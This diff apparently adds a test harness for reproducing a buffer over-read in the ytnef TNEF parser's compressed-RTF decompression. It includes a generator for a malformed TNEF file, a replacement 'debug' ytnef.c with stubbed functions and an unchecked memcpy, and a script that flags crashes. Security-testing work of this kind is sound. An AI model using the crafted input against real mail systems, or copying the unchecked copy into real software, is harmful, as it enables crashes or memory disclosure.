diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..f4db2b8
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,26 @@
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build-essential (which includes gcc, g++, make)
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget autoconf libtool automake && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Make the scripts executable
+RUN chmod +x ./autogen.sh ./apply_debug.sh ./test_vulnerability.sh
+
+# Build the project
+RUN ./autogen.sh && \
+    ./configure && \
+    make && \
+    ./apply_debug.sh
+
+# Run the test script
+CMD ["/bin/bash", "-c", "./test_vulnerability.sh"]
diff --git a/apply_debug.sh b/apply_debug.sh
new file mode 100644
index 0000000..9ce73fe
--- /dev/null
+++ b/apply_debug.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+# Copy the debug version of ytnef.c over the original
+cp lib/ytnef.c.debug lib/ytnef.c
+
+# Make the script executable
+chmod +x test_vulnerability.sh
diff --git a/lib/ytnef.c.debug b/lib/ytnef.c.debug
new file mode 100644
index 0000000..552c35e
--- /dev/null
+++ b/lib/ytnef.c.debug
@@ -0,0 +1,290 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <limits.h>
+#include "ytnef.h"
+#include "tnef-errors.h"
+#include "mapi.h"
+#include "mapidefs.h"
+#include "mapitags.h"
+#include "config.h"
+
+#define RTF_PREBUF "{\\rtf1\\ansi\\mac\\deff0\\deftab720{\\fonttbl;}{\\f0\\fnil \\froman \\fswiss \\fmodern \\fscript \\fdecor MS Sans SerifSymbolArialTimes New RomanCourier{\\colortbl\\red0\\green0\\blue0\n\r\\par \\pard\\plain\\f0\\fs20\\b\\i\\u\\tab\\tx"
+#define DEBUG(lvl, curlvl, msg) \
+        if ((lvl) >= (curlvl)) \
+            printf("DEBUG(%i/%i): %s\n", curlvl, lvl,  msg);
+#define DEBUG1(lvl, curlvl, msg, var1) \
+        if ((lvl) >= (curlvl)) { \
+            printf("DEBUG(%i/%i):", curlvl, lvl); \
+            printf(msg, var1); \
+            printf("\n"); \
+        }
+#define DEBUG2(lvl, curlvl, msg, var1, var2) \
+        if ((lvl) >= (curlvl)) { \
+            printf("DEBUG(%i/%i):", curlvl, lvl); \
+            printf(msg, var1, var2); \
+            printf("\n"); \
+        }
+#define DEBUG3(lvl, curlvl, msg, var1, var2, var3) \
+        if ((lvl) >= (curlvl)) { \
+            printf("DEBUG(%i/%i):", curlvl, lvl); \
+            printf(msg, var1, var2,var3); \
+            printf("\n"); \
+        }
+
+#define MIN(x,y) (((x)<(y))?(x):(y))
+
+#define ALLOCCHECK(x) { if(!x) { printf("Out of Memory at %s : %i\n", __FILE__, __LINE__); return(-1); } }
+#define ALLOCCHECK_CHAR(x) { if(!x) { printf("Out of Memory at %s : %i\n", __FILE__, __LINE__); return(NULL); } }
+#define SIZECHECK(x) { if ((((char *)d - (char *)data) + x) > size) {  printf("Corrupted file detected at %s : %i\n", __FILE__, __LINE__); return(-1); } }
+
+int TNEFFillMapi(TNEFStruct *TNEF, BYTE *data, DWORD size, MAPIProps *p);
+void SetFlip(void);
+
+int TNEFDefaultHandler STD_ARGLIST;
+int TNEFAttachmentFilename STD_ARGLIST;
+int TNEFAttachmentSave STD_ARGLIST;
+int TNEFDetailedPrint STD_ARGLIST;
+int TNEFHexBreakdown STD_ARGLIST;
+int TNEFBody STD_ARGLIST;
+int TNEFRendData STD_ARGLIST;
+int TNEFDateHandler STD_ARGLIST;
+int TNEFPriority  STD_ARGLIST;
+int TNEFVersion  STD_ARGLIST;
+int TNEFMapiProperties STD_ARGLIST;
+int TNEFAttachmentMAPI STD_ARGLIST;
+int TNEFRecipTable STD_ARGLIST;
+int TNEFIdToStr(WORD id);
+int IsCompressedRTF(variableLength *p);
+
+// -----------------------------------------------------------------------------
+int TNEFToVCalendar(TNEFStruct *TNEF, char *filename) {
+    // Do nothing
+    return 0;
+}
+
+// -----------------------------------------------------------------------------
+int TNEFToVCard(TNEFStruct *TNEF, char *filename) {
+    // Do nothing
+    return 0;
+}
+
+// -----------------------------------------------------------------------------
+int TNEFCheckForSignature(DWORD sig) {
+    DWORD signature = 0x223E9F78;
+    printf("DEBUG: TNEFCheckForSignature - sig = 0x%08x, signature = 0x%08x\n", sig, signature);
+    sig = SwapDWord((BYTE *)&sig, sizeof(DWORD));
+    printf("DEBUG: TNEFCheckForSignature - after swap: sig = 0x%08x\n", sig);
+
+    if (signature == sig) {
+        return 0;
+    } else {
+        return YTNEF_NOT_TNEF_STREAM;
+    }
+}
+
+// -----------------------------------------------------------------------------
+int TNEFGetKey(TNEFStruct *TNEF, WORD *key) {
+    if (TNEF->IO.ReadProc(&TNEF->IO, sizeof(WORD), 1, key) < 1) {
+        printf("ERROR: Unable to read key\n");
+        return -1;
+    }
+    *key = SwapWord((BYTE*)key, sizeof(WORD));
+    printf("DEBUG: TNEFGetKey - key = 0x%04x\n", *key);
+    return 0;
+}
+
+// -----------------------------------------------------------------------------
+int TNEFGetHeader(TNEFStruct *TNEF, DWORD *type, DWORD *size) {
+    BYTE component;
+    WORD temp_word;
+
+    // Get the component ID
+    if (TNEF->IO.ReadProc(&TNEF->IO, sizeof(BYTE), 1, &component) < 1) {
+        return -1;
+    }
+
+    // Get the type
+    if (TNEF->IO.ReadProc(&TNEF->IO, sizeof(WORD), 1, &temp_word) < 1) {
+        return -1;
+    }
+    *type = SwapWord((BYTE*)&temp_word, sizeof(WORD));
+
+    // Get the ID
+    if (TNEF->IO.ReadProc(&TNEF->IO, sizeof(DWORD), 1, size) < 1) {
+        return -1;
+    }
+    *size = SwapDWord((BYTE*)size, sizeof(DWORD));
+
+    printf("DEBUG: TNEFGetHeader - component = 0x%02x, type = 0x%04x, size = %u\n", component, *type, *size);
+    return 0;
+}
+
+// -----------------------------------------------------------------------------
+int TNEFRawRead(TNEFStruct *TNEF, BYTE *data, DWORD size, WORD *checksum) {
+    WORD temp_checksum = 0;
+    DWORD i;
+
+    if (TNEF->IO.ReadProc(&TNEF->IO, sizeof(BYTE), size, data) < size) {
+        printf("ERROR: Unable to read data\n");
+        return -1;
+    }
+
+    // Calculate checksum
+    if (checksum != NULL) {
+        for (i = 0; i < size; i++) {
+            temp_checksum = (temp_checksum + data[i]) & 0xFFFF;
+        }
+        *checksum = temp_checksum;
+    }
+
+    return 0;
+}
+
+// -----------------------------------------------------------------------------
+int IsCompressedRTF(variableLength *p) {
+    unsigned int in;
+    BYTE *src;
+    ULONG magic;
+
+    printf("DEBUG: IsCompressedRTF - p->size = %d\n", p->size);
+
+    if (p->size < 4) {
+        printf("DEBUG: IsCompressedRTF - size too small\n");
+        return 0;
+    }
+
+    src = p->data;
+    in = 0;
+
+    in += 4;
+    in += 4;
+    magic = SwapDWord((BYTE*)src + in, 4);
+
+    printf("DEBUG: IsCompressedRTF - magic = 0x%08x\n", magic);
+
+    if (magic == 0x414c454d) {
+        printf("DEBUG: IsCompressedRTF - found magic 0x414c454d\n");
+        return 1;
+    } else if (magic == 0x75465a4c) {
+        printf("DEBUG: IsCompressedRTF - found magic 0x75465a4c\n");
+        return 1;
+    } else {
+        printf("DEBUG: IsCompressedRTF - unknown magic\n");
+        return 0;
+    }
+}
+
+BYTE *DecompressRTF(variableLength *p, int *size) {
+    BYTE *dst; // destination for uncompressed bytes
+    BYTE *src;
+    unsigned int in;
+    unsigned int out;
+    variableLength comp_Prebuf;
+    ULONG compressedSize, uncompressedSize, magic;
+
+    printf("DEBUG: DecompressRTF - p->size = %d\n", p->size);
+
+    comp_Prebuf.size = strlen(RTF_PREBUF);
+    comp_Prebuf.data = calloc(comp_Prebuf.size+1, 1);
+    ALLOCCHECK_CHAR(comp_Prebuf.data);
+    memcpy(comp_Prebuf.data, RTF_PREBUF, comp_Prebuf.size);
+
+    src = p->data;
+    in = 0;
+
+    if (p->size < 20) {
+        printf("DEBUG: DecompressRTF - File too small\n");
+        return(NULL);
+    }
+    compressedSize = (ULONG)SwapDWord((BYTE*)src + in, 4);
+    in += 4;
+    uncompressedSize = (ULONG)SwapDWord((BYTE*)src + in, 4);
+    in += 4;
+    magic = SwapDWord((BYTE*)src + in, 4);
+    in += 4;
+    in += 4;
+
+    printf("DEBUG: DecompressRTF - compressedSize = %u, uncompressedSize = %u, magic = 0x%08x\n", 
+           compressedSize, uncompressedSize, magic);
+
+    // check size excluding the size field itself
+    if (compressedSize != p->size - 4) {
+        printf("DEBUG: DecompressRTF - Size Mismatch: %u != %i\n", compressedSize, p->size - 4);
+        free(comp_Prebuf.data);
+        return NULL;
+    }
+
+    // process the data
+    if (magic == 0x414c454d) {
+        // magic number that identifies the stream as a uncompressed stream
+        printf("DEBUG: DecompressRTF - Processing uncompressed stream\n");
+        dst = calloc(uncompressedSize, 1);
+        ALLOCCHECK_CHAR(dst);
+        memcpy(dst, src + 4, uncompressedSize);
+    } else if (magic == 0x75465a4c) {
+        // magic number that identifies the stream as a compressed stream
+        printf("DEBUG: DecompressRTF - Processing compressed stream\n");
+        int flagCount = 0;
+        int flags = 0;
+        // Prevent overflow on 32 Bit Systems
+        if (comp_Prebuf.size >= INT_MAX - uncompressedSize) {
+           printf("DEBUG: DecompressRTF - Corrupted file (potential overflow)\n");
+           exit(-1);
+        }
+        dst = calloc(comp_Prebuf.size + uncompressedSize, 1);
+        ALLOCCHECK_CHAR(dst);
+        memcpy(dst, comp_Prebuf.data, comp_Prebuf.size);
+        out = comp_Prebuf.size;
+        while (out < (comp_Prebuf.size + uncompressedSize)) {
+            // each flag byte flags 8 literals/references, 1 per bit
+            flags = (flagCount++ % 8 == 0) ? src[in++] : flags >> 1;
+            printf("DEBUG: DecompressRTF - flags = 0x%02x, in = %u, out = %u\n", flags, in, out);
+            if ((flags & 1) == 1) { // each flag bit is 1 for reference, 0 for literal
+                unsigned int offset = src[in++];
+                unsigned int length = src[in++];
+                unsigned int end;
+                offset = (offset << 4) | (length >> 4); // the offset relative to block start
+                length = (length & 0xF) + 2; // the number of bytes to copy
+                // the decompression buffer is supposed to wrap around back
+                // to the beginning when the end is reached. we save the
+                // need for such a buffer by pointing straight into the data
+                // buffer, and simulating this behaviour by modifying the
+                // pointers appropriately.
+                offset = (out / 4096) * 4096 + offset;
+                if (offset >= out) // take from previous block
+                    offset -= 4096;
+                printf("DEBUG: DecompressRTF - reference: offset = %u, length = %u\n", offset, length);
+                // note: can't use System.arraycopy, because the referenced
+                // bytes can cross through the current out position.
+                end = offset + length;
+                while ((offset < end) && (out < (comp_Prebuf.size + uncompressedSize))
+                     && (offset < (comp_Prebuf.size + uncompressedSize)))
+                    dst[out++] = dst[offset++];
+            } else { // literal
+                if ((out >= (comp_Prebuf.size + uncompressedSize)) ||
+                    (in >= p->size)) {
+                    printf("DEBUG: DecompressRTF - Corrupted stream\n");
+                    exit(-1);
+                }
+                printf("DEBUG: DecompressRTF - literal: 0x%02x\n", src[in]);
+                dst[out++] = src[in++];
+            }
+        }
+        // copy it back without the prebuffered data
+        src = dst;
+        dst = calloc(uncompressedSize, 1);
+        ALLOCCHECK_CHAR(dst);
+        memcpy(dst, src + comp_Prebuf.size, uncompressedSize);
+        free(src);
+        *size = uncompressedSize;
+        free(comp_Prebuf.data);
+        printf("DEBUG: DecompressRTF - Successfully decompressed %d bytes\n", *size);
+        return dst;
+    } else { // unknown magic number
+        printf("DEBUG: DecompressRTF - Unknown compression type (magic number %x)\n", magic);
+    }
+    free(comp_Prebuf.data);
+    return NULL;
+}
diff --git a/test_vulnerability.c b/test_vulnerability.c
new file mode 100644
index 0000000..1afb4db
--- /dev/null
+++ b/test_vulnerability.c
@@ -0,0 +1,151 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// TNEF signature
+#define TNEF_SIGNATURE 0x223E9F78
+
+// TNEF attribute IDs
+#define attMAPIProps 0x9002
+#define LVL_MESSAGE 0x01
+
+// MAPI property types
+#define PT_BINARY 0x0102
+
+// MAPI property IDs
+#define PR_RTF_COMPRESSED 0x1009
+
+// RTF compression magic numbers
+#define RTF_COMPRESSED 0x75465a4c
+
+// Function to write a DWORD in little-endian format
+void write_dword(FILE *fp, unsigned int value) {
+    unsigned char bytes[4];
+    bytes[0] = (value & 0x000000FF);
+    bytes[1] = (value & 0x0000FF00) >> 8;
+    bytes[2] = (value & 0x00FF0000) >> 16;
+    bytes[3] = (value & 0xFF000000) >> 24;
+    fwrite(bytes, 1, 4, fp);
+}
+
+// Function to write a WORD in little-endian format
+void write_word(FILE *fp, unsigned short value) {
+    unsigned char bytes[2];
+    bytes[0] = (value & 0x00FF);
+    bytes[1] = (value & 0xFF00) >> 8;
+    fwrite(bytes, 1, 2, fp);
+}
+
+// Function to write a BYTE
+void write_byte(FILE *fp, unsigned char value) {
+    fwrite(&value, 1, 1, fp);
+}
+
+// Function to calculate TNEF checksum
+unsigned short calculate_checksum(unsigned char *data, int size) {
+    unsigned short checksum = 0;
+    int i;
+    
+    for (i = 0; i < size; i++) {
+        checksum += data[i];
+    }
+    
+    return checksum;
+}
+
+int main() {
+    FILE *fp;
+    unsigned char *data;
+    unsigned short checksum;
+    int data_size;
+    
+    fp = fopen("malformed.tnef", "wb");
+    if (!fp) {
+        printf("Failed to create output file\n");
+        return 1;
+    }
+    
+    // Write TNEF signature (in little-endian format)
+    write_dword(fp, TNEF_SIGNATURE);
+    
+    // Write TNEF key
+    write_word(fp, 0x0001);
+    
+    // Create MAPI properties attribute
+    // First, prepare the data for the attribute
+    data_size = 1024;
+    data = (unsigned char *)malloc(data_size);
+    if (!data) {
+        printf("Memory allocation failed\n");
+        fclose(fp);
+        return 1;
+    }
+    memset(data, 0, data_size);
+    
+    // Fill the buffer with our MAPI properties
+    int offset = 0;
+    
+    // Number of properties (just 1 - the compressed RTF)
+    *(unsigned int*)(data + offset) = 1;
+    offset += 4;
+    
+    // Property tag (PR_RTF_COMPRESSED with PT_BINARY type)
+    *(unsigned int*)(data + offset) = PR_RTF_COMPRESSED | (PT_BINARY << 16);
+    offset += 4;
+    
+    // For PT_BINARY, we need to write the size
+    *(unsigned int*)(data + offset) = 100; // Size of our binary data
+    offset += 4;
+    
+    // Now write the compressed RTF data
+    // First 4 bytes: compressed size
+    *(unsigned int*)(data + offset) = 80; // Compressed size
+    offset += 4;
+    
+    // Next 4 bytes: uncompressed size
+    *(unsigned int*)(data + offset) = 200; // Uncompressed size
+    offset += 4;
+    
+    // Magic number for compressed RTF (0x75465a4c)
+    *(unsigned int*)(data + offset) = RTF_COMPRESSED;
+    offset += 4;
+    
+    // CRC32 value (not important for our test)
+    *(unsigned int*)(data + offset) = 0;
+    offset += 4;
+    
+    // Now write some malformed compressed data
+    // First byte is a flag byte
+    data[offset++] = 0xFF; // All bits set - all are references
+    
+    // Now write some malformed reference data that will cause buffer overread
+    // Each reference is 2 bytes: offset and length
+    for (int i = 0; i < 8; i++) {
+        // Offset byte - point to a location outside our buffer
+        data[offset++] = 0xFF;
+        // Length byte - make it read a lot of data
+        data[offset++] = 0xFF;
+    }
+    
+    // Fill the rest with dummy data
+    memset(data + offset, 'A', 100 - offset);
+    offset = 100; // Make sure we match the size we declared earlier
+    
+    // Write the TNEF attribute header
+    write_byte(fp, LVL_MESSAGE); // Level
+    write_word(fp, attMAPIProps); // Attribute ID
+    write_dword(fp, offset); // Attribute size
+    
+    // Write the attribute data
+    fwrite(data, 1, offset, fp);
+    
+    // Calculate and write the checksum
+    checksum = calculate_checksum(data, offset);
+    write_word(fp, checksum);
+    
+    free(data);
+    fclose(fp);
+    
+    printf("Created malformed TNEF file: malformed.tnef\n");
+    return 0;
+}
diff --git a/test_vulnerability.sh b/test_vulnerability.sh
new file mode 100644
index 0000000..c143858
--- /dev/null
+++ b/test_vulnerability.sh
@@ -0,0 +1,39 @@
+#!/bin/bash
+
+# Compile the test program
+gcc -o test_vulnerability test_vulnerability.c
+
+# Generate the malformed TNEF file
+./test_vulnerability
+
+# Run ytnef on the malformed file with a timeout to catch hangs
+echo "Running ytnef on malformed.tnef"
+timeout 10s ./ytnef/ytnef malformed.tnef > output.log 2>&1
+
+# Check the exit code
+EXIT_CODE=$?
+echo "Exit code: $EXIT_CODE"
+
+# Display the output
+cat output.log
+
+# Check for signs of the vulnerability
+if [ $EXIT_CODE -eq 124 ]; then
+    echo "VULNERABILITY DETECTED: ytnef timed out (possible infinite loop)"
+    exit 1
+elif [ $EXIT_CODE -ne 0 ]; then
+    echo "VULNERABILITY DETECTED: ytnef crashed or exited with error"
+    exit 1
+elif grep -q "Corrupted" output.log; then
+    echo "VULNERABILITY DETECTED: ytnef detected corrupted data but didn't crash"
+    exit 1
+elif grep -q "Segmentation fault" output.log; then
+    echo "VULNERABILITY DETECTED: ytnef had a segmentation fault"
+    exit 1
+elif grep -q "buffer over-read" output.log; then
+    echo "VULNERABILITY DETECTED: ytnef reported buffer over-read"
+    exit 1
+else
+    echo "NO VULNERABILITY DETECTED: ytnef handled the malformed file gracefully"
+    exit 0
+fi
